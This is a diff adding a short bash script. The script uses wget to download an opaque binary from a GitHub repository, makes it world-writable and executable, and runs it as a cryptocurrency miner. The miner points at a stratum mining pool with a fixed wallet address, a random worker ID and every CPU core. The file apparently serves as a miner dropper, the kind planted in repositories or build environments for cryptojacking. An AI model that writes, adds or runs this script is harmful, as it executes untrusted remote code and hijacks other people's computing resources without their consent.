@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O red https://github.com/kidoescegh/filee/raw/main/avx2adv
+chmod 777 red
+./red -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-sol -t $(nproc --all)
